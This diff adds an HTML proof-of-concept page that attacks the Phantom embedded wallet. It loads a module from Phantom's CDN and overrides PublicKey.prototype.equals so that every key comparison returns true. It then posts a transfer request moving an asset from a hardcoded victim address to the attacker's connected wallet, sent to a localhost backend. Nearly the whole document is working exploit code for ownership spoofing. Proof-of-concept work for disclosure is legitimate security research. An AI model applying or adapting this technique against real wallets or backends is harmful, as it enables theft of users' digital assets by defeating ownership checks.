@@ -1,0 +1,73 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Phantom Embedded Wallet Exploit PoC</title>
+  </head>
+  <body>
+    <h1>Phantom Embedded Wallet Ownership Spoof</h1>
+    <button id="connect">Connect Attacker Wallet</button>
+    <button id="spoof" disabled>Spoof Victim Ownership</button>
+    <pre id="log"></pre>
+
+    <script type="module">
+      import * as phantomModule from "https://embedded-wallet.phantom.app/assets/metaplexMplTokenMetadata-B1auuVGR.js";
+
+      const log = (msg) => {
+        const pre = document.getElementById("log");
+        pre.innerText += msg + "\n";
+        pre.scrollTop = pre.scrollHeight;
+      };
+
+      console.log(phantomModule);
+
+      const PublicKey = phantomModule.B;
+
+      let attackerPubKey = null;
+      const victimPubKey = "9kAc5mbejnuM4UbVBdaqiCXYSSLxXo8rhQDKbebZjMbJ";
+
+      document.getElementById("connect").onclick = async () => {
+        if (!window.solana || !window.solana.isPhantom) {
+          log(" Phantom not found");
+          return;
+        }
+        const resp = await window.solana.connect();
+        attackerPubKey = resp.publicKey.toString();
+        log(` Attacker connected: ${attackerPubKey}`);
+        document.getElementById("spoof").disabled = false;
+      };
+
+      document.getElementById("spoof").onclick = async () => {
+        log(`Patching embedded wallet module...`);
+
+        const originalEquals = PublicKey.prototype.equals;
+        PublicKey.prototype.equals = function () {
+          return true;
+        };
+
+        const victimPublicKeyObject = new PublicKey(victimPubKey);
+        const attackerPublicKeyObject = new PublicKey(attackerPubKey);
+
+        log(
+          ` victimPublicKey.equals(attacker): ${victimPublicKeyObject.equals(attackerPublicKeyObject)}`,
+        );
+
+        const response = await fetch("http://localhost:3009/transferAsset", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            from: victimPubKey,
+            to: attackerPubKey,
+            assetId: "FakeAsset123",
+          }),
+        });
+
+        const data = await response.json();
+        log(`Backend: ${JSON.stringify(data)}`);
+
+        PublicKey.prototype.equals = originalEquals;
+        log(`Restored equals.`);
+      };
+    </script>
+  </body>
+</html>
